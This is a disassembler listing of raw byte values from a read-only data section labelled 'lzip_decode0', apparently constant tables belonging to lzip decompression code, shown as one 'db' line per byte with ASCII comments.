.rodata.lzip_decode0:000000000000B3C0                 db  82h
.rodata.lzip_decode0:000000000000B3C1                 db    1
.rodata.lzip_decode0:000000000000B3C2                 db    0
.rodata.lzip_decode0:000000000000B3C3                 db    0
.rodata.lzip_decode0:000000000000B3C4                 db  43h ; C
.rodata.lzip_decode0:000000000000B3C5                 db    1
.rodata.lzip_decode0:000000000000B3C6                 db    0
.rodata.lzip_decode0:000000000000B3C7                 db    0
.rodata.lzip_decode0:000000000000B3C8                 db  82h
.rodata.lzip_decode0:000000000000B3C9                 db    0
.rodata.lzip_decode0:000000000000B3CA                 db    0
.rodata.lzip_decode0:000000000000B3CB                 db    0
.rodata.lzip_decode0:000000000000B3CC                 db    4
.rodata.lzip_decode0:000000000000B3CD                 db    0
.rodata.lzip_decode0:000000000000B3CE                 db    8
.rodata.lzip_decode0:000000000000B3CF                 db    4
.rodata.lzip_decode0:000000000000B3D0                 db  82h
.rodata.lzip_decode0:000000000000B3D1                 db    2
.rodata.lzip_decode0:000000000000B3D2                 db    0
.rodata.lzip_decode0:000000000000B3D3                 db    0
.rodata.lzip_decode0:000000000000B3D4                 db  51h ; Q
.rodata.lzip_decode0:000000000000B3D5                 db    2
.rodata.lzip_decode0:000000000000B3D6                 db    4
.rodata.lzip_decode0:000000000000B3D7                 db    0
.rodata.lzip_decode0:000000000000B3D8                 db  33h ; 3
.rodata.lzip_decode0:000000000000B3D9                 db    0
.rodata.lzip_decode0:000000000000B3DA                 db    0
.rodata.lzip_decode0:000000000000B3DB                 db    0
.rodata.lzip_decode0:000000000000B3DC                 db 0D3h
.rodata.lzip_decode0:000000000000B3DD                 db    0
.rodata.lzip_decode0:000000000000B3DE                 db    0
.rodata.lzip_decode0:000000000000B3DF                 db    0
.rodata.lzip_decode0:000000000000B3E0                 db 0C3h
.rodata.lzip_decode0:000000000000B3E1                 db    0
.rodata.lzip_decode0:000000000000B3E2                 db    0
.rodata.lzip_decode0:000000000000B3E3                 db    0
.rodata.lzip_decode0:000000000000B3E4                 db  92h
.rodata.lzip_decode0:000000000000B3E5                 db    1
.rodata.lzip_decode0:000000000000B3E6                 db    0
.rodata.lzip_decode0:000000000000B3E7                 db    0
.rodata.lzip_decode0:000000000000B3E8                 db    4
.rodata.lzip_decode0:000000000000B3E9                 db    0
.rodata.lzip_decode0:000000000000B3EA                 db 0F8h
.rodata.lzip_decode0:000000000000B3EB                 db    0
.rodata.lzip_decode0:000000000000B3EC                 db  32h ; 2
.rodata.lzip_decode0:000000000000B3ED                 db    2
.rodata.lzip_decode0:000000000000B3EE                 db    0
.rodata.lzip_decode0:000000000000B3EF                 db    0
.rodata.lzip_decode0:000000000000B3F0                 db  11h
.rodata.lzip_decode0:000000000000B3F1                 db    2
.rodata.lzip_decode0:000000000000B3F2                 db    4
.rodata.lzip_decode0:000000000000B3F3                 db    0
.rodata.lzip_decode0:000000000000B3F4                 db 0C3h
.rodata.lzip_decode0:000000000000B3F5                 db    1
.rodata.lzip_decode0:000000000000B3F6                 db    0
.rodata.lzip_decode0:000000000000B3F7                 db    0
.rodata.lzip_decode0:000000000000B3F8                 db  62h ; b
.rodata.lzip_decode0:000000000000B3F9                 db    1
.rodata.lzip_decode0:000000000000B3FA                 db    0
.rodata.lzip_decode0:000000000000B3FB                 db    0
.rodata.lzip_decode0:000000000000B3FC                 db  92h
.rodata.lzip_decode0:000000000000B3FD                 db    0
.rodata.lzip_decode0:000000000000B3FE                 db    0
.rodata.lzip_decode0:000000000000B3FF                 db    0
.rodata.lzip_decode0:000000000000B400                 db  20h
.rodata.lzip_decode0:000000000000B401                 db    2
.rodata.lzip_decode0:000000000000B402                 db  44h ; D
.rodata.lzip_decode0:000000000000B403                 db    0
.rodata.lzip_decode0:000000000000B404                 db 0A2h
.rodata.lzip_decode0:000000000000B405                 db    1
.rodata.lzip_decode0:000000000000B406                 db    0
.rodata.lzip_decode0:000000000000B407                 db    0
.rodata.lzip_decode0:000000000000B408                 db    4
.rodata.lzip_decode0:000000000000B409                 db    0
.rodata.lzip_decode0:000000000000B40A                 db  10h
.rodata.lzip_decode0:000000000000B40B                 db  0Dh
.rodata.lzip_decode0:000000000000B40C                 db  42h ; B
.rodata.lzip_decode0:000000000000B40D                 db    1
.rodata.lzip_decode0:000000000000B40E                 db    0
.rodata.lzip_decode0:000000000000B40F                 db    0
.rodata.lzip_decode0:000000000000B410                 db  13h
.rodata.lzip_decode0:000000000000B411                 db    0
.rodata.lzip_decode0:000000000000B412                 db    0
.rodata.lzip_decode0:000000000000B413                 db    0
.rodata.lzip_decode0:000000000000B414                 db 0B3h
.rodata.lzip_decode0:000000000000B415                 db    1
.rodata.lzip_decode0:000000000000B416                 db    0
.rodata.lzip_decode0:000000000000B417                 db    0
.rodata.lzip_decode0:000000000000B418                 db    4
.rodata.lzip_decode0:000000000000B419                 db    0
.rodata.lzip_decode0:000000000000B41A                 db 0F8h
.rodata.lzip_decode0:000000000000B41B                 db  0Ah
.rodata.lzip_decode0:000000000000B41C                 db  22h ; "
.rodata.lzip_decode0:000000000000B41D                 db    1
.rodata.lzip_decode0:000000000000B41E                 db    0
.rodata.lzip_decode0:000000000000B41F                 db    0
.rodata.lzip_decode0:000000000000B420                 db  12h
.rodata.lzip_decode0:000000000000B421                 db    0
.rodata.lzip_decode0:000000000000B422                 db    0
.rodata.lzip_decode0:000000000000B423                 db    0
.rodata.lzip_decode0:000000000000B424                 db  50h ; P
.rodata.lzip_decode0:000000000000B425                 db    3
.rodata.lzip_decode0:000000000000B426                 db  0Ch
.rodata.lzip_decode0:000000000000B427                 db    0
.rodata.lzip_decode0:000000000000B428                 db 0B2h
.rodata.lzip_decode0:000000000000B429                 db    1
.rodata.lzip_decode0:000000000000B42A                 db    0
.rodata.lzip_decode0:000000000000B42B                 db    0
.rodata.lzip_decode0:000000000000B42C                 db  71h ; q
.rodata.lzip_decode0:000000000000B42D                 db    1
.rodata.lzip_decode0:000000000000B42E                 db    4
.rodata.lzip_decode0:000000000000B42F                 db    0
.rodata.lzip_decode0:000000000000B430                 db  62h ; b
.rodata.lzip_decode0:000000000000B431                 db    1
.rodata.lzip_decode0:000000000000B432                 db    0
.rodata.lzip_decode0:000000000000B433                 db    0
.rodata.lzip_decode0:000000000000B434                 db  63h ; c
.rodata.lzip_decode0:000000000000B435                 db    0
.rodata.lzip_decode0:000000000000B436                 db    0
.rodata.lzip_decode0:000000000000B437                 db    0
.rodata.lzip_decode0:000000000000B438                 db  52h ; R
.rodata.lzip_decode0:000000000000B439                 db    0
.rodata.lzip_decode0:000000000000B43A                 db    0
.rodata.lzip_decode0:000000000000B43B                 db    0
.rodata.lzip_decode0:000000000000B43C                 db  93h
.rodata.lzip_decode0:000000000000B43D                 db    1
.rodata.lzip_decode0:000000000000B43E                 db    0
.rodata.lzip_decode0:000000000000B43F                 db    0
.rodata.lzip_decode0:000000000000B440                 db 0F2h
.rodata.lzip_decode0:000000000000B441                 db    1
.rodata.lzip_decode0:000000000000B442                 db    0
.rodata.lzip_decode0:000000000000B443                 db    0
.rodata.lzip_decode0:000000000000B444                 db    4
.rodata.lzip_decode0:000000000000B445                 db    0
.rodata.lzip_decode0:000000000000B446                 db 0F8h
.rodata.lzip_decode0:000000000000B447                 db    6
.rodata.lzip_decode0:000000000000B448                 db  42h ; B
.rodata.lzip_decode0:000000000000B449                 db    1
.rodata.lzip_decode0:000000000000B44A                 db    0
.rodata.lzip_decode0:000000000000B44B                 db    0
.rodata.lzip_decode0:000000000000B44C                 db  13h
.rodata.lzip_decode0:000000000000B44D                 db    0
.rodata.lzip_decode0:000000000000B44E                 db    0
.rodata.lzip_decode0:000000000000B44F                 db    0
.rodata.lzip_decode0:000000000000B450                 db 0B3h
.rodata.lzip_decode0:000000000000B451                 db    1
.rodata.lzip_decode0:000000000000B452                 db    0
.rodata.lzip_decode0:000000000000B453                 db    0
.rodata.lzip_decode0:000000000000B454                 db    4
.rodata.lzip_decode0:000000000000B455                 db    0
.rodata.lzip_decode0:000000000000B456                 db  58h ; X
.rodata.lzip_decode0:000000000000B457                 db    7
.rodata.lzip_decode0:000000000000B458                 db  32h ; 2
.rodata.lzip_decode0:000000000000B459                 db    1
.rodata.lzip_decode0:000000000000B45A                 db    0
.rodata.lzip_decode0:000000000000B45B                 db    0
.rodata.lzip_decode0:000000000000B45C                 db    3
.rodata.lzip_decode0:000000000000B45D                 db    0
.rodata.lzip_decode0:000000000000B45E                 db    0
.rodata.lzip_decode0:000000000000B45F                 db    0
.rodata.lzip_decode0:000000000000B460                 db    3
.rodata.lzip_decode0:000000000000B461                 db    0
.rodata.lzip_decode0:000000000000B462                 db    0
.rodata.lzip_decode0:000000000000B463                 db    0
.rodata.lzip_decode0:000000000000B464                 db  42h ; B
.rodata.lzip_decode0:000000000000B465                 db    0
.rodata.lzip_decode0:000000000000B466                 db    0
.rodata.lzip_decode0:000000000000B467                 db    0
.rodata.lzip_decode0:000000000000B468                 db  53h ; S
.rodata.lzip_decode0:000000000000B469                 db    0
.rodata.lzip_decode0:000000000000B46A                 db    0
.rodata.lzip_decode0:000000000000B46B                 db    0
.rodata.lzip_decode0:000000000000B46C                 db  23h ; #
.rodata.lzip_decode0:000000000000B46D                 db    1
.rodata.lzip_decode0:000000000000B46E                 db    0
.rodata.lzip_decode0:000000000000B46F                 db    0
.rodata.lzip_decode0:000000000000B470                 db  43h ; C
.rodata.lzip_decode0:000000000000B471                 db    0
.rodata.lzip_decode0:000000000000B472                 db    0
.rodata.lzip_decode0:000000000000B473                 db    0
.rodata.lzip_decode0:000000000000B474                 db 0C2h
.rodata.lzip_decode0:000000000000B475                 db    0
.rodata.lzip_decode0:000000000000B476                 db    0
.rodata.lzip_decode0:000000000000B477                 db    0
.rodata.lzip_decode0:000000000000B478                 db    3
.rodata.lzip_decode0:000000000000B479                 db    0
.rodata.lzip_decode0:000000000000B47A                 db    0
.rodata.lzip_decode0:000000000000B47B                 db    0
.rodata.lzip_decode0:000000000000B47C                 db 0B3h
.rodata.lzip_decode0:000000000000B47D                 db    0
.rodata.lzip_decode0:000000000000B47E                 db    0
.rodata.lzip_decode0:000000000000B47F                 db    0
.rodata.lzip_decode0:000000000000B480                 db  32h ; 2
.rodata.lzip_decode0:000000000000B481                 db    1
.rodata.lzip_decode0:000000000000B482                 db    0
.rodata.lzip_decode0:000000000000B483                 db    0
.rodata.lzip_decode0:000000000000B484                 db  93h
.rodata.lzip_decode0:000000000000B485                 db    0
.rodata.lzip_decode0:000000000000B486                 db    0
.rodata.lzip_decode0:000000000000B487                 db    0
.rodata.lzip_decode0:000000000000B488                 db 0C2h
.rodata.lzip_decode0:000000000000B489                 db    0
.rodata.lzip_decode0:000000000000B48A                 db    0
.rodata.lzip_decode0:000000000000B48B                 db    0
.rodata.lzip_decode0:000000000000B48C                 db  63h ; c
.rodata.lzip_decode0:000000000000B48D                 db    2
.rodata.lzip_decode0:000000000000B48E                 db    0
.rodata.lzip_decode0:000000000000B48F                 db    0
.rodata.lzip_decode0:000000000000B490                 db 0F2h
.rodata.lzip_decode0:000000000000B491                 db    1
.rodata.lzip_decode0:000000000000B492                 db    0
.rodata.lzip_decode0:000000000000B493                 db    0
.rodata.lzip_decode0:000000000000B494                 db  93h
.rodata.lzip_decode0:000000000000B495                 db    0
.rodata.lzip_decode0:000000000000B496                 db    0
.rodata.lzip_decode0:000000000000B497                 db    0
.rodata.lzip_decode0:000000000000B498                 db  12h
.rodata.lzip_decode0:000000000000B499                 db    0
.rodata.lzip_decode0:000000000000B49A                 db    0
.rodata.lzip_decode0:000000000000B49B                 db    0
.rodata.lzip_decode0:000000000000B49C                 db    4
.rodata.lzip_decode0:000000000000B49D                 db    0
.rodata.lzip_decode0:000000000000B49E                 db  10h
.rodata.lzip_decode0:000000000000B49F                 db    5
.rodata.lzip_decode0:000000000000B4A0                 db  32h ; 2
.rodata.lzip_decode0:000000000000B4A1                 db    2
.rodata.lzip_decode0:000000000000B4A2                 db    0
.rodata.lzip_decode0:000000000000B4A3                 db    0
.rodata.lzip_decode0:000000000000B4A4                 db  22h ; "
.rodata.lzip_decode0:000000000000B4A5                 db    0
.rodata.lzip_decode0:000000000000B4A6                 db    0
.rodata.lzip_decode0:000000000000B4A7                 db    0
.rodata.lzip_decode0:000000000000B4A8                 db 0C2h
.rodata.lzip_decode0:000000000000B4A9                 db    0
.rodata.lzip_decode0:000000000000B4AA                 db    0
.rodata.lzip_decode0:000000000000B4AB                 db    0
.rodata.lzip_decode0:000000000000B4AC                 db 0A3h
.rodata.lzip_decode0:000000000000B4AD                 db    1
.rodata.lzip_decode0:000000000000B4AE                 db    0
.rodata.lzip_decode0:000000000000B4AF                 db    0
.rodata.lzip_decode0:000000000000B4B0                 db    2
.rodata.lzip_decode0:000000000000B4B1                 db    2
.rodata.lzip_decode0:000000000000B4B2                 db    0
.rodata.lzip_decode0:000000000000B4B3                 db    0
.rodata.lzip_decode0:000000000000B4B4                 db  43h ; C
.rodata.lzip_decode0:000000000000B4B5                 db    2
.rodata.lzip_decode0:000000000000B4B6                 db    0
.rodata.lzip_decode0:000000000000B4B7                 db    0
.rodata.lzip_decode0:000000000000B4B8                 db  53h ; S
.rodata.lzip_decode0:000000000000B4B9                 db    0
.rodata.lzip_decode0:000000000000B4BA                 db    0
.rodata.lzip_decode0:000000000000B4BB                 db    0
.rodata.lzip_decode0:000000000000B4BC                 db  10h
.rodata.lzip_decode0:000000000000B4BD                 db    4
.rodata.lzip_decode0:000000000000B4BE                 db  68h ; h
.rodata.lzip_decode0:000000000000B4BF                 db    0
.rodata.lzip_decode0:000000000000B4C0                 db  70h ; p
.rodata.lzip_decode0:000000000000B4C1                 db    2
.rodata.lzip_decode0:000000000000B4C2                 db  20h
.rodata.lzip_decode0:000000000000B4C3                 db    0
.rodata.lzip_decode0:000000000000B4C4                 db  72h ; r
.rodata.lzip_decode0:000000000000B4C5                 db    2
.rodata.lzip_decode0:000000000000B4C6                 db    0
.rodata.lzip_decode0:000000000000B4C7                 db    0
.rodata.lzip_decode0:000000000000B4C8                 db  31h ; 1
.rodata.lzip_decode0:000000000000B4C9                 db    2
.rodata.lzip_decode0:000000000000B4CA                 db    8
.rodata.lzip_decode0:000000000000B4CB                 db    0
.rodata.lzip_decode0:000000000000B4CC                 db  72h ; r
.rodata.lzip_decode0:000000000000B4CD                 db    0
.rodata.lzip_decode0:000000000000B4CE                 db    0
.rodata.lzip_decode0:000000000000B4CF                 db    0
.rodata.lzip_decode0:000000000000B4D0                 db  82h
.rodata.lzip_decode0:000000000000B4D1                 db    0
.rodata.lzip_decode0:000000000000B4D2                 db    0
.rodata.lzip_decode0:000000000000B4D3                 db    0
.rodata.lzip_decode0:000000000000B4D4                 db  12h
.rodata.lzip_decode0:000000000000B4D5                 db    1
.rodata.lzip_decode0:000000000000B4D6                 db    0
.rodata.lzip_decode0:000000000000B4D7                 db    0
.rodata.lzip_decode0:000000000000B4D8                 db    4
.rodata.lzip_decode0:000000000000B4D9                 db    0
.rodata.lzip_decode0:000000000000B4DA                 db  28h ; (
.rodata.lzip_decode0:000000000000B4DB                 db  0Ch
.rodata.lzip_decode0:000000000000B4DC                 db  82h
.rodata.lzip_decode0:000000000000B4DD                 db    2
.rodata.lzip_decode0:000000000000B4DE                 db    0
.rodata.lzip_decode0:000000000000B4DF                 db    0
.rodata.lzip_decode0:000000000000B4E0                 db 0E3h
.rodata.lzip_decode0:000000000000B4E1                 db    2
.rodata.lzip_decode0:000000000000B4E2                 db    0
.rodata.lzip_decode0:000000000000B4E3                 db    0
.rodata.lzip_decode0:000000000000B4E4                 db  32h ; 2
.rodata.lzip_decode0:000000000000B4E5                 db    2
.rodata.lzip_decode0:000000000000B4E6                 db    0
.rodata.lzip_decode0:000000000000B4E7                 db    0
.rodata.lzip_decode0:000000000000B4E8                 db  43h ; C
.rodata.lzip_decode0:000000000000B4E9                 db    2
.rodata.lzip_decode0:000000000000B4EA                 db    0
.rodata.lzip_decode0:000000000000B4EB                 db    0
.rodata.lzip_decode0:000000000000B4EC                 db  92h
.rodata.lzip_decode0:000000000000B4ED                 db    1
.rodata.lzip_decode0:000000000000B4EE                 db    0
.rodata.lzip_decode0:000000000000B4EF                 db    0
.rodata.lzip_decode0:000000000000B4F0                 db  82h
.rodata.lzip_decode0:000000000000B4F1                 db    0
.rodata.lzip_decode0:000000000000B4F2                 db    0
.rodata.lzip_decode0:000000000000B4F3                 db    0
.rodata.lzip_decode0:000000000000B4F4                 db  43h ; C
.rodata.lzip_decode0:000000000000B4F5                 db    2
.rodata.lzip_decode0:000000000000B4F6                 db    0
.rodata.lzip_decode0:000000000000B4F7                 db    0
.rodata.lzip_decode0:000000000000B4F8                 db    4
.rodata.lzip_decode0:000000000000B4F9                 db    0
.rodata.lzip_decode0:000000000000B4FA                 db  60h ; `
.rodata.lzip_decode0:000000000000B4FB                 db  0Ch
.rodata.lzip_decode0:000000000000B4FC                 db 0E2h
.rodata.lzip_decode0:000000000000B4FD                 db    3
.rodata.lzip_decode0:000000000000B4FE                 db    0
.rodata.lzip_decode0:000000000000B4FF                 db    0
.rodata.lzip_decode0:000000000000B500                 db    3
.rodata.lzip_decode0:000000000000B501                 db    0
.rodata.lzip_decode0:000000000000B502                 db    0
.rodata.lzip_decode0:000000000000B503                 db    0
.rodata.lzip_decode0:000000000000B504                 db  53h ; S
.rodata.lzip_decode0:000000000000B505                 db    4
.rodata.lzip_decode0:000000000000B506                 db    0
.rodata.lzip_decode0:000000000000B507                 db    0
.rodata.lzip_decode0:000000000000B508                 db  32h ; 2
.rodata.lzip_decode0:000000000000B509                 db    2
.rodata.lzip_decode0:000000000000B50A                 db    0
.rodata.lzip_decode0:000000000000B50B                 db    0
.rodata.lzip_decode0:000000000000B50C                 db    2
.rodata.lzip_decode0:000000000000B50D                 db    2
.rodata.lzip_decode0:000000000000B50E                 db    0
.rodata.lzip_decode0:000000000000B50F                 db    0
.rodata.lzip_decode0:000000000000B510                 db    4
.rodata.lzip_decode0:000000000000B511                 db    0
.rodata.lzip_decode0:000000000000B512                 db  88h
.rodata.lzip_decode0:000000000000B513                 db    1
.rodata.lzip_decode0:000000000000B514                 db  30h ; 0
.rodata.lzip_decode0:000000000000B515                 db    1
.rodata.lzip_decode0:000000000000B516                 db 0CCh
.rodata.lzip_decode0:000000000000B517                 db    1
.rodata.lzip_decode0:000000000000B518                 db  70h ; p
.rodata.lzip_decode0:000000000000B519                 db    0
.rodata.lzip_decode0:000000000000B51A                 db  10h
.rodata.lzip_decode0:000000000000B51B                 db    1
.rodata.lzip_decode0:000000000000B51C                 db  60h ; `
.rodata.lzip_decode0:000000000000B51D                 db    0
.rodata.lzip_decode0:000000000000B51E                 db 0D0h
.rodata.lzip_decode0:000000000000B51F                 db    0
.rodata.lzip_decode0:000000000000B520                 db  30h ; 0
.rodata.lzip_decode0:000000000000B521                 db    0
.rodata.lzip_decode0:000000000000B522                 db  3Ch ; <
.rodata.lzip_decode0:000000000000B523                 db    0
.rodata.lzip_decode0:000000000000B524                 db  40h ; @
.rodata.lzip_decode0:000000000000B525                 db    4
.rodata.lzip_decode0:000000000000B526                 db  1Ch
.rodata.lzip_decode0:000000000000B527                 db    0
.rodata.lzip_decode0:000000000000B528                 db    1
.rodata.lzip_decode0:000000000000B529                 db    0
.rodata.lzip_decode0:000000000000B52A                 db    4
.rodata.lzip_decode0:000000000000B52B                 db    0
.rodata.lzip_decode0:000000000000B52C                 db  81h
.rodata.lzip_decode0:000000000000B52D                 db    2
.rodata.lzip_decode0:000000000000B52E                 db  14h
.rodata.lzip_decode0:000000000000B52F                 db    0
.rodata.lzip_decode0:000000000000B530                 db 0A2h
.rodata.lzip_decode0:000000000000B531                 db    0
.rodata.lzip_decode0:000000000000B532                 db    0
.rodata.lzip_decode0:000000000000B533                 db    0
.rodata.lzip_decode0:000000000000B534                 db  70h ; p
.rodata.lzip_decode0:000000000000B535                 db    2
.rodata.lzip_decode0:000000000000B536                 db  38h ; 8
.rodata.lzip_decode0:000000000000B537                 db    2
.rodata.lzip_decode0:000000000000B538                 db 0C2h
.rodata.lzip_decode0:000000000000B539                 db    1
.rodata.lzip_decode0:000000000000B53A                 db    0
.rodata.lzip_decode0:000000000000B53B                 db    0
.rodata.lzip_decode0:000000000000B53C                 db    4
.rodata.lzip_decode0:000000000000B53D                 db    0
.rodata.lzip_decode0:000000000000B53E                 db 0C0h
.rodata.lzip_decode0:000000000000B53F                 db    8
.rodata.lzip_decode0:000000000000B540                 db 0F2h
.rodata.lzip_decode0:000000000000B541                 db    3
.rodata.lzip_decode0:000000000000B542                 db    0
.rodata.lzip_decode0:000000000000B543                 db    0
.rodata.lzip_decode0:000000000000B544                 db  53h ; S
.rodata.lzip_decode0:000000000000B545                 db    3
.rodata.lzip_decode0:000000000000B546                 db    0
.rodata.lzip_decode0:000000000000B547                 db    0
.rodata.lzip_decode0:000000000000B548                 db  13h
.rodata.lzip_decode0:000000000000B549                 db    1
.rodata.lzip_decode0:000000000000B54A                 db    0
.rodata.lzip_decode0:000000000000B54B                 db    0
.rodata.lzip_decode0:000000000000B54C                 db 0F2h
.rodata.lzip_decode0:000000000000B54D                 db    0
.rodata.lzip_decode0:000000000000B54E                 db    0
.rodata.lzip_decode0:000000000000B54F                 db    0
.rodata.lzip_decode0:000000000000B550                 db  13h
.rodata.lzip_decode0:000000000000B551                 db    1
.rodata.lzip_decode0:000000000000B552                 db    0
.rodata.lzip_decode0:000000000000B553                 db    0
.rodata.lzip_decode0:000000000000B554                 db 0E2h
.rodata.lzip_decode0:000000000000B555                 db    1
.rodata.lzip_decode0:000000000000B556                 db    0
.rodata.lzip_decode0:000000000000B557                 db    0
.rodata.lzip_decode0:000000000000B558                 db  72h ; r
.rodata.lzip_decode0:000000000000B559                 db    1
.rodata.lzip_decode0:000000000000B55A                 db    0
.rodata.lzip_decode0:000000000000B55B                 db    0
.rodata.lzip_decode0:000000000000B55C                 db    2
.rodata.lzip_decode0:000000000000B55D                 db    1
.rodata.lzip_decode0:000000000000B55E                 db    0
.rodata.lzip_decode0:000000000000B55F                 db    0
.rodata.lzip_decode0:000000000000B560                 db    4
.rodata.lzip_decode0:000000000000B561                 db    0
.rodata.lzip_decode0:000000000000B562                 db 0A8h
.rodata.lzip_decode0:000000000000B563                 db    6
.rodata.lzip_decode0:000000000000B564                 db  82h
.rodata.lzip_decode0:000000000000B565                 db    1
.rodata.lzip_decode0:000000000000B566                 db    0
.rodata.lzip_decode0:000000000000B567                 db    0
.rodata.lzip_decode0:000000000000B568                 db  43h ; C
.rodata.lzip_decode0:000000000000B569                 db    1
.rodata.lzip_decode0:000000000000B56A                 db    0
.rodata.lzip_decode0:000000000000B56B                 db    0
.rodata.lzip_decode0:000000000000B56C                 db  53h ; S
.rodata.lzip_decode0:000000000000B56D                 db    0
.rodata.lzip_decode0:000000000000B56E                 db    0
.rodata.lzip_decode0:000000000000B56F                 db    0
.rodata.lzip_decode0:000000000000B570                 db 0E2h
.rodata.lzip_decode0:000000000000B571                 db    0
.rodata.lzip_decode0:000000000000B572                 db    0
.rodata.lzip_decode0:000000000000B573                 db    0
.rodata.lzip_decode0:000000000000B574                 db 0E2h
.rodata.lzip_decode0:000000000000B575                 db    0
.rodata.lzip_decode0:000000000000B576                 db    0
.rodata.lzip_decode0:000000000000B577                 db    0
.rodata.lzip_decode0:000000000000B578                 db  23h ; #
.rodata.lzip_decode0:000000000000B579                 db    1
.rodata.lzip_decode0:000000000000B57A                 db    0
.rodata.lzip_decode0:000000000000B57B                 db    0
.rodata.lzip_decode0:000000000000B57C                 db  83h
.rodata.lzip_decode0:000000000000B57D                 db    1
.rodata.lzip_decode0:000000000000B57E                 db    0
.rodata.lzip_decode0:000000000000B57F                 db    0
.rodata.lzip_decode0:000000000000B580                 db 0C2h
.rodata.lzip_decode0:000000000000B581                 db    0
.rodata.lzip_decode0:000000000000B582                 db    0
.rodata.lzip_decode0:000000000000B583                 db    0
.rodata.lzip_decode0:000000000000B584                 db 0F2h
.rodata.lzip_decode0:000000000000B585                 db    3
.rodata.lzip_decode0:000000000000B586                 db    0
.rodata.lzip_decode0:000000000000B587                 db    0
.rodata.lzip_decode0:000000000000B588                 db 0E3h
.rodata.lzip_decode0:000000000000B589                 db    4
.rodata.lzip_decode0:000000000000B58A                 db    0
.rodata.lzip_decode0:000000000000B58B                 db    0
.rodata.lzip_decode0:000000000000B58C                 db  82h
.rodata.lzip_decode0:000000000000B58D                 db    0
.rodata.lzip_decode0:000000000000B58E                 db    0
.rodata.lzip_decode0:000000000000B58F                 db    0
.rodata.lzip_decode0:000000000000B590                 db  72h ; r
.rodata.lzip_decode0:000000000000B591                 db    1
.rodata.lzip_decode0:000000000000B592                 db    0
.rodata.lzip_decode0:000000000000B593                 db    0
.rodata.lzip_decode0:000000000000B594                 db  43h ; C
.rodata.lzip_decode0:000000000000B595                 db    1
.rodata.lzip_decode0:000000000000B596                 db    0
.rodata.lzip_decode0:000000000000B597                 db    0
.rodata.lzip_decode0:000000000000B598                 db  53h ; S
.rodata.lzip_decode0:000000000000B599                 db    0
.rodata.lzip_decode0:000000000000B59A                 db    0
.rodata.lzip_decode0:000000000000B59B                 db    0
.rodata.lzip_decode0:000000000000B59C                 db 0E2h
.rodata.lzip_decode0:000000000000B59D                 db    0
.rodata.lzip_decode0:000000000000B59E                 db    0
.rodata.lzip_decode0:000000000000B59F                 db    0
.rodata.lzip_decode0:000000000000B5A0                 db 0E2h
.rodata.lzip_decode0:000000000000B5A1                 db    0
.rodata.lzip_decode0:000000000000B5A2                 db    0
.rodata.lzip_decode0:000000000000B5A3                 db    0
.rodata.lzip_decode0:000000000000B5A4                 db  23h ; #
.rodata.lzip_decode0:000000000000B5A5                 db    1
.rodata.lzip_decode0:000000000000B5A6                 db    0
.rodata.lzip_decode0:000000000000B5A7                 db    0
.rodata.lzip_decode0:000000000000B5A8                 db 0B2h
.rodata.lzip_decode0:000000000000B5A9                 db    0
.rodata.lzip_decode0:000000000000B5AA                 db    0
.rodata.lzip_decode0:000000000000B5AB                 db    0
.rodata.lzip_decode0:000000000000B5AC                 db  93h
.rodata.lzip_decode0:000000000000B5AD                 db    1
.rodata.lzip_decode0:000000000000B5AE                 db    0
.rodata.lzip_decode0:000000000000B5AF                 db    0
.rodata.lzip_decode0:000000000000B5B0                 db  23h ; #
.rodata.lzip_decode0:000000000000B5B1                 db    0
.rodata.lzip_decode0:000000000000B5B2                 db    0
.rodata.lzip_decode0:000000000000B5B3                 db    0
.rodata.lzip_decode0:000000000000B5B4                 db  52h ; R
.rodata.lzip_decode0:000000000000B5B5                 db    0
.rodata.lzip_decode0:000000000000B5B6                 db    0
.rodata.lzip_decode0:000000000000B5B7                 db    0
.rodata.lzip_decode0:000000000000B5B8                 db  62h ; b
.rodata.lzip_decode0:000000000000B5B9                 db    2
.rodata.lzip_decode0:000000000000B5BA                 db    0
.rodata.lzip_decode0:000000000000B5BB                 db    0
.rodata.lzip_decode0:000000000000B5BC                 db  10h
.rodata.lzip_decode0:000000000000B5BD                 db    0
.rodata.lzip_decode0:000000000000B5BE                 db  5Ch ; \
.rodata.lzip_decode0:000000000000B5BF                 db    0
.rodata.lzip_decode0:000000000000B5C0                 db  62h ; b
.rodata.lzip_decode0:000000000000B5C1                 db    1
.rodata.lzip_decode0:000000000000B5C2                 db    0
.rodata.lzip_decode0:000000000000B5C3                 db    0
.rodata.lzip_decode0:000000000000B5C4                 db  21h ; !
.rodata.lzip_decode0:000000000000B5C5                 db    2
.rodata.lzip_decode0:000000000000B5C6                 db    4
.rodata.lzip_decode0:000000000000B5C7                 db    0
.rodata.lzip_decode0:000000000000B5C8                 db    4
.rodata.lzip_decode0:000000000000B5C9                 db    0
.rodata.lzip_decode0:000000000000B5CA                 db 0E0h
.rodata.lzip_decode0:000000000000B5CB                 db    1
.rodata.lzip_decode0:000000000000B5CC                 db 0B2h
.rodata.lzip_decode0:000000000000B5CD                 db    2
.rodata.lzip_decode0:000000000000B5CE                 db    0
.rodata.lzip_decode0:000000000000B5CF                 db    0
.rodata.lzip_decode0:000000000000B5D0                 db 0A2h
.rodata.lzip_decode0:000000000000B5D1                 db    1
.rodata.lzip_decode0:000000000000B5D2                 db    0
.rodata.lzip_decode0:000000000000B5D3                 db    0
.rodata.lzip_decode0:000000000000B5D4                 db  43h ; C
.rodata.lzip_decode0:000000000000B5D5                 db    2
.rodata.lzip_decode0:000000000000B5D6                 db    0
.rodata.lzip_decode0:000000000000B5D7                 db    0
.rodata.lzip_decode0:000000000000B5D8                 db  83h
.rodata.lzip_decode0:000000000000B5D9                 db    0
.rodata.lzip_decode0:000000000000B5DA                 db    0
.rodata.lzip_decode0:000000000000B5DB                 db    0
.rodata.lzip_decode0:000000000000B5DC                 db  52h ; R
.rodata.lzip_decode0:000000000000B5DD                 db    1
.rodata.lzip_decode0:000000000000B5DE                 db    0
.rodata.lzip_decode0:000000000000B5DF                 db    0
.rodata.lzip_decode0:000000000000B5E0                 db  13h
.rodata.lzip_decode0:000000000000B5E1                 db    0
.rodata.lzip_decode0:000000000000B5E2                 db    0
.rodata.lzip_decode0:000000000000B5E3                 db    0
.rodata.lzip_decode0:000000000000B5E4                 db 0C2h
.rodata.lzip_decode0:000000000000B5E5                 db    0
.rodata.lzip_decode0:000000000000B5E6                 db    0
.rodata.lzip_decode0:000000000000B5E7                 db    0
.rodata.lzip_decode0:000000000000B5E8                 db  32h ; 2
.rodata.lzip_decode0:000000000000B5E9                 db    0
.rodata.lzip_decode0:000000000000B5EA                 db    0
.rodata.lzip_decode0:000000000000B5EB                 db    0
.rodata.lzip_decode0:000000000000B5EC                 db  13h
.rodata.lzip_decode0:000000000000B5ED                 db    1
